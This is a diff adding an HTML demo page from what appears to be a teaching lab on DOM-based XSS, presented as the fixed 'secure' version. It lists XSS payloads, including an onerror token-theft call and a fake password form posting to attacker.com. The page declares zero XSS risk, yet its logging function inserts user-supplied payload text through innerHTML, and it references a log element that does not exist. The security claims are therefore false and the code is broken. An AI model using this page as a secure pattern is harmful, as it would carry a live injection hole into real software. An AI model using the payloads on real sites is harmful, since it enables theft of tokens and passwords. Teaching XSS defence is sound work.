@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Version 4 — Secure (Fixed Code)</title>
+
+  <!-- ══════════════════════════════════════════════════
+       VERSION 4: SECURE — ROOT CAUSE FIXED
+
+       SECURITY MEASURES APPLIED:
+       1. textContent replaces innerHTML → no HTML parsing
+       2. Strict nonce-based CSP (same as V3)
+       3. All URL parameters treated as plain text
+       4. No HTML is ever rendered from user input
+
+       WHY THIS WORKS:
+       textContent sets the text content of an element.
+       It does NOT parse HTML. Any HTML tags in the input
+       are displayed as literal characters, not rendered.
+       
+       <img src=x onerror=stealToken()>
+       → Displayed as text: "<img src=x onerror=stealToken()>"
+       → NOT executed. NOT rendered as an image element.
+
+       This eliminates the DOM-XSS vulnerability entirely.
+  ══════════════════════════════════════════════════ -->
+
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self';
+                 script-src 'self' 'nonce-xSec2024ProjectNonce';
+                 style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+                 font-src https://fonts.gstatic.com;
+                 img-src 'self' data:;
+                 connect-src 'self';">
+
+  <link rel="stylesheet" href="shared.css">
+  <style>
+    .vuln-section { border: 1px solid rgba(0,245,196,0.3); }
+    .vuln-header { background: rgba(0,245,196,0.06); border-bottom: 1px solid rgba(0,245,196,0.15); }
+    .vuln-header h3 { color: var(--accent); }
+    .render-zone { border-color: rgba(0,245,196,0.35); border-style: solid; }
+    .render-zone-label { color: var(--accent); }
+    .url-field input:focus { border-color: var(--accent); }
+    .inject-btn { background: #00aa88; }
+    .inject-btn:hover { background: var(--accent); color: #000; }
+    .payload-item:hover { border-color: var(--accent); }
+    .payload-item .pi-tag { color: var(--accent); }
+  </style>
+</head>
+<body>
+
+<div class="exp-banner banner-v4">
+  <div class="eb-left">
+    <span class="eb-tag">Version 4 / 4</span>
+    <span class="eb-title">✅ Secure — textContent Fix</span>
+    <span class="eb-desc">Root vulnerability eliminated — all payloads rendered as harmless text</span>
+  </div>
+  <a href="index.html" style="color:var(--accent)">← Back to Hub</a>
+</div>
+
+<div id="blockedBanner" style="display:none;position:fixed;top:56px;left:0;right:0;z-index:999;background:rgba(10,10,15,.97);border-bottom:2px solid rgba(0,245,196,.4);padding:14px 24px;align-items:center;gap:14px;">
+  <span style="font-size:22px">✅</span>
+  <div>
+    <div style="color:#00f5c4;font-weight:bold;font-size:14px">Attack Neutralized — No XSS Occurred</div>
+    <div style="color:#6b6b80;font-size:12px;margin-top:2px">
+      <code style="color:#00f5c4">textContent</code> treats the payload as plain text — no HTML is parsed, no event fires, <code>stealToken()</code> is never called.
+      Check <b style="color:#00f5c4">localhost:9000/view</b> — nothing arrived on the attacker server.
+    </div>
+  </div>
+  <button onclick="this.parentElement.style.display='none'" style="margin-left:auto;background:none;border:1px solid #333;color:#6b6b80;padding:4px 10px;border-radius:4px;cursor:pointer">×</button>
+</div>
+
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="icon">🎓</div>
+    <div class="name">Academia<span>Secure</span></div>
+  </div>
+  <div class="nav-section">Navigation</div>
+  <a class="nav-item active" href="#"><span class="ni">🏠</span> Dashboard</a>
+  <a class="nav-item" href="#secure-demo"><span class="ni">✅</span> Secure Demo</a>
+  <a class="nav-item" href="#why-works"><span class="ni">🔍</span> Why It Works</a>
+
+  <div class="version-links">
+    <div class="vl-title">Experiment Versions</div>
+    <a class="vl-item" href="dashboard-v1-no-csp.html"><div class="vl-dot" style="background:var(--accent2)"></div> V1 — No CSP</a>
+    <a class="vl-item" href="dashboard-v2-weak-csp.html"><div class="vl-dot" style="background:var(--warn)"></div> V2 — Weak CSP</a>
+    <a class="vl-item" href="dashboard-v3-strict-csp.html"><div class="vl-dot" style="background:var(--accent3)"></div> V3 — Strict CSP</a>
+    <a class="vl-item current" href="dashboard-v4-secure.html"><div class="vl-dot" style="background:var(--accent)"></div> V4 — Secure Code</a>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="page-title">Student Dashboard</div>
+      <div class="breadcrumb">experiment / v4 / secure-textcontent</div>
+    </div>
+    <div class="topbar-right">
+      <div class="user-pill">
+        <div class="avatar" id="avatarLetter">S</div>
+        <span class="uname" id="displayUser">student</span>
+      </div>
+      <button class="logout-btn" onclick="logout()">Logout →</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="label">GPA</div>
+        <div class="value" style="color:var(--accent)">3.85</div>
+        <div class="sub">↑ This semester</div>
+        <div class="corner">📈</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">Courses</div>
+        <div class="value">6</div>
+        <div class="sub">Enrolled this term</div>
+        <div class="corner">📚</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">CSP Status</div>
+        <div class="value" style="font-size:13px;color:var(--accent);font-family:var(--mono);margin-top:6px">STRICT</div>
+        <div class="sub" style="color:var(--accent)">Nonce-based policy</div>
+        <div class="corner">🛡</div>
+      </div>
+      <div class="stat-card">
+        <div class="label">XSS Risk</div>
+        <div class="value" style="font-size:13px;color:var(--accent);font-family:var(--mono);margin-top:6px">NONE</div>
+        <div class="sub" style="color:var(--accent)">Root cause fixed ✓</div>
+        <div class="corner">✅</div>
+      </div>
+    </div>
+
+    <div class="main-grid">
+      <div class="panel">
+        <div class="panel-header"><h3>📊 Grades</h3><span class="ph-badge badge-ok">Fully Protected</span></div>
+        <div class="panel-body">
+          <table>
+            <thead><tr><th>Course</th><th>Code</th><th>Grade</th></tr></thead>
+            <tbody>
+              <tr><td>Web Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-481</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>Cryptography</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-460</td><td><span class="grade-pill gA">A-</span></td></tr>
+              <tr><td>Network Security</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-450</td><td><span class="grade-pill gB">B+</span></td></tr>
+              <tr><td>Software Eng.</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-390</td><td><span class="grade-pill gA">A</span></td></tr>
+              <tr><td>OS</td><td style="font-family:var(--mono);font-size:12px;color:var(--muted)">CS-340</td><td><span class="grade-pill gB">B</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><h3>🔑 Session Token</h3><span class="ph-badge badge-ok">Protected</span></div>
+        <div class="panel-body">
+          <div class="token-box" style="background:rgba(0,245,196,0.05);border-color:rgba(0,245,196,0.15)">
+            <div class="tb-label" style="color:var(--accent)">✓ auth_token — JS theft impossible (no executable injection)</div>
+            <div class="token-display" id="tokenDisplay">Loading...</div>
+          </div>
+          <p style="font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:12px;line-height:1.7">
+            Because <code style="color:var(--accent)">textContent</code> is used, no injected payload can execute. Token is safe from XSS-based theft. <span style="color:var(--warn)">For complete protection, use HttpOnly cookies instead of localStorage.</span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Secure Demo -->
+    <div class="vuln-section" id="secure-demo">
+      <div class="vuln-header">
+        <span style="font-size:20px">✅</span>
+        <div>
+          <h3>Secure Rendering — All Payloads Neutralized</h3>
+          <p>Fix applied: <code style="color:var(--accent)">textContent</code> replaces <code style="color:var(--accent2)">innerHTML</code> · Input treated as plain text · No HTML parsed</p>
+        </div>
+        <span class="ph-badge badge-ok" style="margin-left:auto">SECURE</span>
+      </div>
+      <div class="vuln-body">
+
+        <div class="result-box" style="background:rgba(0,245,196,0.05);border-color:rgba(0,245,196,0.2);color:var(--accent)">
+          <div class="rb-title">✅ Expected Behavior — Version 4</div>
+          <span style="color:var(--muted)">Every payload — including <code style="color:var(--warn)">onerror</code>, <code style="color:var(--warn)">onload</code>, <code style="color:var(--warn)">&lt;script&gt;</code>, and <code style="color:var(--warn)">&lt;form&gt;</code> — will be displayed as <b style="color:var(--accent)">literal text</b>. No HTML is parsed. No JavaScript executes. The attack is completely neutralized at the source.</span>
+        </div>
+
+        <div class="url-label" style="margin-top:16px">Try any payload — observe it renders as plain text:</div>
+        <div class="url-field">
+          <input type="text" id="reportInput" placeholder="Try any XSS payload — it will be displayed as text only"/>
+          <button class="inject-btn" onclick="simulateInject()">Test →</button>
+        </div>
+
+        <div class="url-label">📍 textContent Render Zone — <span style="color:var(--accent)">all input is plain text</span>:</div>
+        <div class="render-zone" id="renderZone">
+          <span class="render-zone-label">textContent sink — SECURE</span>
+          <span style="color:var(--muted);font-family:var(--mono);font-size:12px">Awaiting payload — it will appear as harmless text...</span>
+        </div>
+
+        <div class="payload-grid">
+          <div class="payload-item" onclick="loadPayload('<img src=x onerror=alert(\'This will NOT execute\')>')">
+            <div class="pi-tag">1. onerror → Displayed as text ✓</div>
+            <div class="pi-code">&lt;img src=x onerror=alert(...)&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<script>alert(\'This will NOT execute either\')<\/script>')">
+            <div class="pi-tag">2. &lt;script&gt; tag → Displayed as text ✓</div>
+            <div class="pi-code">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<img src=x onerror=stealToken()>')">
+            <div class="pi-tag">3. Token Theft → Neutralized ✓</div>
+            <div class="pi-code">&lt;img src=x onerror=stealToken()&gt;</div>
+          </div>
+          <div class="payload-item" onclick="loadPayload('<form action=https://attacker.com><input type=password><button>Steal</button></form>')">
+            <div class="pi-tag">4. Fake Form → Displayed as text ✓</div>
+            <div class="pi-code">&lt;form action=attacker.com&gt;...&lt;/form&gt;</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Why It Works -->
+    <div class="panel full-width" id="why-works" style="margin-bottom:20px">
+      <div class="panel-header"><h3>🔍 Why textContent Fixes the Vulnerability</h3><span class="ph-badge badge-ok">Root Cause Analysis</span></div>
+      <div class="panel-body">
+        <div class="code-snippet">
+          <div class="cs-header"><span class="lang">JavaScript — The Fix Explained</span><span>dashboard-v4-secure.html</span></div>
+          <pre><span class="cm">// ══ VULNERABLE (V1, V2, V3) ════════════════════════════════</span>
+<span class="kw">const</span> report = <span class="kw">new</span> URLSearchParams(window.location.search).get(<span class="str">'report'</span>);
+element.<span class="hi-red">innerHTML</span> = report;
+<span class="cm">// Input:  &lt;img src=x onerror=stealToken()&gt;
+// Result: Browser PARSES this as HTML
+//         → Creates an &lt;img&gt; element
+//         → onerror event fires
+//         → stealToken() executes
+//         → Token stolen ✗</span>
+
+<span class="cm">// ══ SECURE (V4) ════════════════════════════════════════════</span>
+<span class="kw">const</span> report = <span class="kw">new</span> URLSearchParams(window.location.search).get(<span class="str">'report'</span>);
+element.<span class="hi-green">textContent</span> = report;
+<span class="cm">// Input:  &lt;img src=x onerror=stealToken()&gt;
+// Result: Browser treats this as PLAIN TEXT
+//         → Displays the literal string on screen
+//         → No HTML element created
+//         → No event fires
+//         → No JS executes
+//         → Attack neutralized ✓</span>
+
+<span class="cm">// ══ ALTERNATIVE: DOMPurify sanitizer ═══════════════════════</span>
+<span class="cm">// If rich HTML rendering is required:</span>
+<span class="kw">const</span> clean = DOMPurify.<span class="hi-green">sanitize</span>(report, { ALLOWED_TAGS: [<span class="str">'b'</span>, <span class="str">'i'</span>, <span class="str">'u'</span>, <span class="str">'p'</span>] });
+element.innerHTML = clean;
+<span class="cm">// DOMPurify removes all event handlers and dangerous elements
+// while preserving safe formatting tags ✓</span></pre>
+        </div>
+
+        <!-- Comparison table -->
+        <div style="margin-top:16px;overflow-x:auto">
+          <table style="font-size:12px">
+            <thead>
+              <tr>
+                <th>Version</th>
+                <th>Sink Used</th>
+                <th>HTML Parsed?</th>
+                <th>JS Executes?</th>
+                <th>HTML Injected?</th>
+                <th>Token Stolen?</th>
+                <th>Verdict</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>V1 — No CSP</td>
+                <td style="font-family:var(--mono);color:var(--accent2)">innerHTML</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">CRITICAL</td>
+              </tr>
+              <tr>
+                <td>V2 — unsafe-inline</td>
+                <td style="font-family:var(--mono);color:var(--accent2)">innerHTML</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--warn);font-family:var(--mono)">FALSE SAFE</td>
+              </tr>
+              <tr>
+                <td>V3 — Strict CSP</td>
+                <td style="font-family:var(--mono);color:var(--accent2)">innerHTML</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No</td>
+                <td style="color:var(--accent2);font-family:var(--mono)">✗ Yes</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No (JS)</td>
+                <td style="color:var(--accent3);font-family:var(--mono)">PARTIAL</td>
+              </tr>
+              <tr>
+                <td>V4 — Secure</td>
+                <td style="font-family:var(--mono);color:var(--accent)">textContent</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No</td>
+                <td style="color:var(--accent);font-family:var(--mono)">✓ No</td>
+                <td style="color:var(--accent);font-family:var(--mono)">SECURE ✓</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+   
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script nonce="xSec2024ProjectNonce">
+  const token = localStorage.getItem('auth_token');
+  if (!token) window.location.href = 'login.html';
+  const authUser = localStorage.getItem('auth_user') || 'student';
+  document.getElementById('displayUser').textContent = authUser;
+  document.getElementById('avatarLetter').textContent = authUser.charAt(0).toUpperCase();
+  document.getElementById('tokenDisplay').innerHTML =
+    '<b style="color:var(--accent)">' + token.substring(0,35) + '...</b><br><span style="opacity:0.5">' + token.substring(35,70) + '...</span>';
+
+  const logs = [];
+  function addLog(msg, type='ok') {
+    logs.unshift({ ts: new Date().toLocaleTimeString(), msg, type });
+    document.getElementById('logContainer').innerHTML = logs.map(l =>
+      `<div class="log-line"><span class="ll-ts">${l.ts}</span><span class="ll-${l.type}">${l.msg}</span></div>`
+    ).join('');
+  }
+
+  addLog('✓ Secure page loaded — textContent sink active', 'ok');
+  addLog('✓ CSP active: nonce-based policy', 'ok');
+  addLog('✓ All URL parameters treated as plain text', 'ok');
+  addLog('✓ No HTML parsing from user input', 'ok');
+
+  const urlReport = new URLSearchParams(window.location.search).get('report');
+  if (urlReport) {
+    // ✅ SECURE SINK — textContent, no HTML parsing
+    document.getElementById('renderZone').textContent = urlReport;
+    document.getElementById('reportInput').value = urlReport;
+    addLog('URL ?report= received — rendered safely via textContent', 'ok');
+    addLog('Payload displayed as literal text: ' + urlReport.substring(0,50), 'ok');
+  }
+
+  function simulateInject() {
+    const payload = document.getElementById('reportInput').value;
+    if (!payload) return;
+    // ✅ SECURE: textContent — treats everything as plain text
+    document.getElementById('renderZone').textContent = payload;
+    history.pushState({}, '', '?report=' + encodeURIComponent(payload));
+    addLog('✓ Payload safely rendered as text (no HTML parsed): ' + payload.substring(0,50), 'ok');
+    if (payload.toLowerCase().includes('stealtoken')) {
+      document.getElementById('blockedBanner').style.display = 'flex';
+      addLog('✅ stealToken() never called — textContent prevented all HTML parsing', 'ok');
+    }
+  }
+
+  function loadPayload(p) {
+    document.getElementById('reportInput').value = p;
+    addLog('Payload loaded for testing: ' + p.substring(0,50), 'info');
+  }
+
+  function logout() { localStorage.clear(); window.location.href = 'login.html'; }
+</script>
+</body>
+</html>
